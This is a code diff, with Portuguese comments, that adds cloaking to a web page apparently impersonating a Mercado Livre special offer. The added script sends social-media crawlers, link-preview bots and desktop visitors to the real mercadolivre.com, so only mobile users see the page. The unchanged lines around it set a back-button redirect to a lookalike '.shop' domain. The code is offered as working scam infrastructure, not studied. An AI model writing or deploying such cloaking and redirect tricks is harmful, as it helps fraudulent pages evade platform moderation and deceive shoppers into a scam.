@@ -8,6 +8,25 @@
   document.head.appendChild(a);
 </script>
 <script>
+  // Função para detectar user agents de bots/crawlers do Facebook
+  function isFacebookBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    return ua.includes("facebookexternalhit") || ua.includes("facebot") || ua.includes("twitterbot") || ua.includes("crawler") || ua.includes("preview") || ua.includes("discord") || ua.includes("telegram");
+  }
+
+  // Função para detectar se o dispositivo é mobile
+  function isMobileDevice() {
+    return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
+  }
+
+  // BLOQUEIO de acesso se for bot OU não for mobile
+  if (isFacebookBot() || !isMobileDevice()) {
+    // Redireciona para página neutra ou trava visual
+    window.location.href = "https://mercadolivre.com"; // Troque para sua página de bloqueio
+  }
+</script>
+
+<script>
   const link = 'https://oferta-especialml25anos.shop/pressao/back';
 
   function setBackRedirect(url) {
